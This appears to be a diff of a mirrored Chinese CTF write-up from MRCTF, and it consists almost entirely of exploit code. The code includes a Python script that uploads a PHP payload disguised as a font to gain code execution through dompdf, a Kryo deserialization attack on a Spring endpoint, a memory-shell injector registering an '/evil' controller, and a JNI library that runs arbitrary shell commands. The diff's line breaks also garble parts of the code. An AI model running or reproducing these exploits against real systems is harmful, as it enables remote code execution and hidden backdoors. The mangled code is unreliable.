@@ -3,19 +3,22 @@
 > 原文: https://www.ctfiot.com/37649.html
 > ID: 37649
 
-import requestsfrom hashlib import md5
+import requests
+from hashlib import md5
 url = "http://246abfb2-0f91-48ec-a88c-b2314709ed87.node1.mrctf.fun:81"
 font_name = "eki"
-def print2pdf(page): param= { "s":"Printer/print", "page":page } res = requests.get(f"{url}/public/index.php",params=param) return res
+def print2pdf(page): param= { "s":"Printer/print", "page":
+page } res = requests.get(f"{url}/public/index.php",params=param) return res
 def upload(filename,raw): data = { "name":"avatar", "type":"image", } res = requests.post(f"{url}/public/index.php?s=admin/upload",data=data,files={"file":(filename,raw,"image/png")}) return res.json()["result"]
 exp_font = "./exp.php"
 php_location = upload("exp.php",open(exp_font,"rb").read())
 print(f"php_location=>{php_location}")
-exp_css = f"""@font-face{{ font-family:'{font_name}'; src:url('http://localhost:81{php_location}'); font-weight:'normal'; font-style:'normal';}}
+exp_css = f"""@font-face{{ font-family:'{font_name}'; src:
+url('http://localhost:81{php_location}'); font-weight:'normal'; font-style:'normal';}}
 css_location = upload("exp.css",exp_css)
 print(f"css_location=>{css_location}")
 
-html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'><span style="font-family:{font_name};">5678</span>"""
+html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'>5678"""
 html_location = upload("exp.html",html)
 
 payload = "/storage/"print(f"html_location=>{html_location}")
@@ -30,11 +33,15 @@ print(f"remote_path=>{remote_path}")
 res = requests.get(url+remote_path)
 print(res.text)
 
-@RequestMapping("/coffee/demo") public Message demoFlavor(@RequestBody String raw) throws Exception { System.out.println(raw); JSONObject serializeConfig = new JSONObject(raw); if(serializeConfig.has("polish")&&serializeConfig.getBoolean("polish")){ kryo=new Kryo(); for (Method setMethod:kryo.getClass().getDeclaredMethods()) { if(!setMethod.getName().startsWith("set")){ continue; } try { Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if(!setMethod.getParameterTypes()[0].isPrimitive()){ try { p1 = Class.forName((String) p1).newInstance(); setMethod.invoke(kryo, p1); }catch (Exception e){ e.printStackTrace(); } }else{ setMethod.invoke(kryo,p1); } }catch (Exception e){ continue; } } }
+@RequestMapping("/coffee/demo") public Message demoFlavor(@RequestBody String raw) throws Exception { System.out.println(raw); JSONObject serializeConfig = new JSONObject(raw); if(serializeConfig.has("polish")&&serializeConfig.getBoolean("polish")){ kryo=new Kryo(); for (Method setMethod:
+kryo.getClass().getDeclaredMethods()) { if(!setMethod.getName().startsWith("set")){ continue; } try { Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if(!setMethod.getParameterTypes()[0].isPrimitive()){ try { p1 = Class.forName((String) p1).newInstance(); setMethod.invoke(kryo, p1); }catch (Exception e){ e.printStackTrace(); } }else{ setMethod.invoke(kryo,p1); } }catch (Exception e){ continue; } } }
  ByteArrayOutputStream bos = new ByteArrayOutputStream(); Output output = new Output(bos); kryo.register(Mocha.class); kryo.writeClassAndObject(output,new Mocha()); output.flush(); output.close();
  return new Message(200,"Mocha!",Base64.getEncoder().encode(bos.toByteArray())); }
 
-def demo(): data = { "polish":True, "References":True, "RegistrationRequired":False, "InstantiatorStrategy":"org.objenesis.strategy.StdInstantiatorStrategy", } res = requests.post(url+"/coffee/demo",json=data)
+def demo(): data = { "polish":
+True, "References":
+True, "RegistrationRequired":
+False, "InstantiatorStrategy":"org.objenesis.strategy.StdInstantiatorStrategy", } res = requests.post(url+"/coffee/demo",json=data)
  return res.json()
 
 static {
@@ -81,19 +88,22 @@ void solve(char* buf){ int pid, infd, outfd; char *cmd[2]; cmd[0] = "/readflag";
 
 
 ```
-import requestsfrom hashlib import md5
+import requests
+from hashlib import md5
 url = "http://246abfb2-0f91-48ec-a88c-b2314709ed87.node1.mrctf.fun:81"
 font_name = "eki"
-def print2pdf(page): param= { "s":"Printer/print", "page":page } res = requests.get(f"{url}/public/index.php",params=param) return res
+def print2pdf(page): param= { "s":"Printer/print", "page":
+page } res = requests.get(f"{url}/public/index.php",params=param) return res
 def upload(filename,raw): data = { "name":"avatar", "type":"image", } res = requests.post(f"{url}/public/index.php?s=admin/upload",data=data,files={"file":(filename,raw,"image/png")}) return res.json()["result"]
 exp_font = "./exp.php"
 php_location = upload("exp.php",open(exp_font,"rb").read())
 print(f"php_location=>{php_location}")
-exp_css = f"""@font-face{{ font-family:'{font_name}'; src:url('http://localhost:81{php_location}'); font-weight:'normal'; font-style:'normal';}}
+exp_css = f"""@font-face{{ font-family:'{font_name}'; src:
+url('http://localhost:81{php_location}'); font-weight:'normal'; font-style:'normal';}}
 css_location = upload("exp.css",exp_css)
 print(f"css_location=>{css_location}")
 
-html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'><span style="font-family:{font_name};">5678</span>"""
+html = f"""<link rel=stylesheet href='http://localhost:81{css_location}'>5678"""
 html_location = upload("exp.html",html)
 
 payload = "/storage/"print(f"html_location=>{html_location}")
@@ -107,26 +117,15 @@ remote_path = f"/vendor/dompdf/dompdf/lib/fonts/{font_name}-normal_{md5helper.he
 print(f"remote_path=>{remote_path}")
 res = requests.get(url+remote_path)
 print(res.text)
-```
-
-
-
-```
-@RequestMapping("/coffee/demo") public Message demoFlavor(@RequestBody String raw) throws Exception { System.out.println(raw); JSONObject serializeConfig = new JSONObject(raw); if(serializeConfig.has("polish")&&serializeConfig.getBoolean("polish")){ kryo=new Kryo(); for (Method setMethod:kryo.getClass().getDeclaredMethods()) { if(!setMethod.getName().startsWith("set")){ continue; } try { Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if(!setMethod.getParameterTypes()[0].isPrimitive()){ try { p1 = Class.forName((String) p1).newInstance(); setMethod.invoke(kryo, p1); }catch (Exception e){ e.printStackTrace(); } }else{ setMethod.invoke(kryo,p1); } }catch (Exception e){ continue; } } }
+@RequestMapping("/coffee/demo") public Message demoFlavor(@RequestBody String raw) throws Exception { System.out.println(raw); JSONObject serializeConfig = new JSONObject(raw); if(serializeConfig.has("polish")&&serializeConfig.getBoolean("polish")){ kryo=new Kryo(); for (Method setMethod:
+kryo.getClass().getDeclaredMethods()) { if(!setMethod.getName().startsWith("set")){ continue; } try { Object p1 = serializeConfig.get(setMethod.getName().substring(3)); if(!setMethod.getParameterTypes()[0].isPrimitive()){ try { p1 = Class.forName((String) p1).newInstance(); setMethod.invoke(kryo, p1); }catch (Exception e){ e.printStackTrace(); } }else{ setMethod.invoke(kryo,p1); } }catch (Exception e){ continue; } } }
  ByteArrayOutputStream bos = new ByteArrayOutputStream(); Output output = new Output(bos); kryo.register(Mocha.class); kryo.writeClassAndObject(output,new Mocha()); output.flush(); output.close();
  return new Message(200,"Mocha!",Base64.getEncoder().encode(bos.toByteArray())); }
-```
-
-
-
-```
-def demo(): data = { "polish":True, "References":True, "RegistrationRequired":False, "InstantiatorStrategy":"org.objenesis.strategy.StdInstantiatorStrategy", } res = requests.post(url+"/coffee/demo",json=data)
+def demo(): data = { "polish":
+True, "References":
+True, "RegistrationRequired":
+False, "InstantiatorStrategy":"org.objenesis.strategy.StdInstantiatorStrategy", } res = requests.post(url+"/coffee/demo",json=data)
  return res.json()
-```
-
-
-
-```
 static {
  try { String inject_uri = "/evil"; System.out.println("Controller Injecting"); WebApplicationContext context = (WebApplicationContext) RequestContextHolder. currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
  Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry"); f.setAccessible(true); Object mappingRegistry = f.get(mappingHandlerMapping);
@@ -139,26 +138,11 @@ static {
  RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration(); option.setPatternParser(new PathPatternParser());
  RequestMappingInfo info = RequestMappingInfo.paths(inject_uri).options(option).build();
  // 将该controller注册到Spring容器 mappingHandlerMapping.registerMapping(info, evilClass.newInstance(), method2); }catch (Exception e){ e.printStackTrace(); } }
-```
-
-
-
-```
 public class MSpringJNIController { public native String doExec(String cmd); @ResponseBody public void index() throws IOException { ... }}
-```
-
-
-
-```
 /* DO NOT EDIT THIS FILE - it is machine generated */#include <jni.h>/* Header for class xyz_eki_serialexp_memshell_MSpringJNIController */
-#ifndef _Included_xyz_eki_serialexp_memshell_MSpringJNIController#define _Included_xyz_eki_serialexp_memshell_MSpringJNIController#ifdef __cplusplusextern "C" {#endif/* * Class: xyz_eki_serialexp_memshell_MSpringJNIController * Method: doExec * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_xyz_eki_serialexp_memshell_MSpringJNIController_doExec (JNIEnv *, jobject, jstring);
-#ifdef __cplusplus}#endif#endif
-```
-
-
-
-```
-#include<jni.h>#include<stdio.h>#include<cstdlib>#include<cstring>#include "xyz_eki_serialexp_memshell_MSpringJNIController.h"
+    #ifndef _Included_xyz_eki_serialexp_memshell_MSpringJNIController#define _Included_xyz_eki_serialexp_memshell_MSpringJNIController#ifdef __cplusplusextern "C" {#endif/* * Class: xyz_eki_serialexp_memshell_MSpringJNIController * Method: doExec * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_xyz_eki_serialexp_memshell_MSpringJNIController_doExec (JNIEnv *, jobject, jstring);
+    #ifdef __cplusplus}#endif#endif
+    #include<jni.h>#include<stdio.h>#include<cstdlib>#include<cstring>#include "xyz_eki_serialexp_memshell_MSpringJNIController.h"
 int execmd(const char *cmd, char *result){ char buffer[1024*12]; //定义缓冲区 FILE *pipe = popen(cmd, "r"); //打开管道，并执行命令 if (!pipe) return 0; //返回0表示运行失败
  while (!feof(pipe)) { if (fgets(buffer, 256, pipe)) { //将管道输出到result中 strcat(result, buffer); } } pclose(pipe); //关闭管道 return 1; //返回1表示运行成功}
 
@@ -166,11 +150,6 @@ JNIEXPORT jstring JNICALL Java_xyz_eki_serialexp_memshell_MSpringJNIController_d
  char return_messge[256] = ""; strcat(return_messge, result); jstring cmdresult = env->NewStringUTF(return_messge);
  return cmdresult;}
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved){ return JNI_VERSION_1_4; //这里很重要，必须返回版本，否则加载会失败。}
-```
-
-
-
-```
 static int start_subprocess(char *command[], int *pid, int *infd, int *outfd){ int p1[2], p2[2];
  if (!pid || !infd || !outfd) return 0;
  if (pipe(p1) == -1) goto err_pipe1; if (pipe(p2) == -1) goto err_pipe2; if ((*pid = fork()) == -1) goto err_fork;
